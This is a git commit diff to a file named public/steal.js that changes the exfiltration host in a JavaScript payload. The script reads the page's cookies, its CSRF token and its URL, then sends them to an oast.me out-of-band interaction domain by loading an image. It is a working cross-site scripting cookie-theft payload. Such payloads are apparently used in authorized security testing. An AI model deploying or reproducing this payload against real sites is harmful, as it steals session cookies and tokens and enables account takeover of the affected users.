0a3ec63cb5358746debcb547d843dafd683398ae
gussamkodin <panjisubagja62@gmail.com>
2026-08-24 13:06:53 +0700

    Update steal.js

--- public/steal.js
+++ public/steal.js
@@ -3,4 +3,4 @@ var cookie=d.cookie;
 var csrf=d.querySelector('meta[name=csrf-token]').content;
 var url=location.href;
 var data='cookie='+encodeURIComponent(cookie)+'&csrf='+encodeURIComponent(csrf)+'&url='+encodeURIComponent(url);
-new Image().src='https://da5tf7gh4jp0t4mqaro03tdnmf789hhws.oast.me/?'+data;
+new Image().src='https://da5tuq8h4jp9v7dddvj03c8ekbz4wdj9h.oast.me/?'+data;
